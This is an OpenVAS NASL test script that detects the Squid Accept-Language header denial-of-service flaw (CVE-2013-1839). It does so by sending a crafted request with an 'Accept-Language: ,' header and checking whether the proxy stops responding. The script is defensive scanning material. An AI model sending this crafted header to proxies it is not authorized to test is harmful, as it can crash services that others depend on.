###############################################################################
# OpenVAS Vulnerability Test
#
# Squid Accept-Language Header Denial Of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:squid-cache:squid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802062");
  script_version("2022-07-20T10:33:02+0000");
  script_cve_id("CVE-2013-1839");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2022-07-20 10:33:02 +0000 (Wed, 20 Jul 2022)");
  script_tag(name:"creation_date", value:"2013-10-03 18:01:36 +0530 (Thu, 03 Oct 2013)");
  script_name("Squid Accept-Language Header DoS Vulnerability (SQUID-2013:1)");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_squid_http_detect.nasl");
  script_mandatory_keys("squid/http/detected");
  script_require_ports("Services/www", "Services/http_proxy", 3128);

  script_xref(name:"URL", value:"http://secunia.com/advisories/52588");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58316");
  script_xref(name:"URL", value:"http://www.squid-cache.org/Advisories/SQUID-2013_1.txt");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2013/03/11/7");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525932/30/30/threaded");

  script_tag(name:"summary", value:"Squid is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted 'Accept-Language' header request and check is it
  vulnerable to DoS.");

  script_tag(name:"solution", value:"Update to version 3.2.9, 3.3.3 or later.");

  script_tag(name:"insight", value:"Error within the 'strHdrAcptLangGetItem()' function in
  errorpage.cc when handling the 'Accept-Language' header.");

  script_tag(name:"affected", value:"Squid version 3.2.x before 3.2.9 and 3.3.x before 3.3.3.");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to cause a
  denial of service via a crafted 'Accept-Language' header.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

normal_req = http_get(item:"http://www.$$$$$", port:port);
normal_res = http_send_recv(port:port, data:normal_req);

if(!normal_res || "Server: squid" >!< normal_res)
  exit(0);

crafted_req = string("GET http://testhostdoesnotexists.com:1234 HTTP/1.1\r\n",
                     "Accept-Language: ,", "\r\n", "\r\n");
crafted_res = http_send_recv(port:port, data:crafted_req);

normal_res = http_send_recv(port:port, data:normal_req);
if(!normal_res) {
  security_message(port:port);
  exit(0);
}

exit(99);
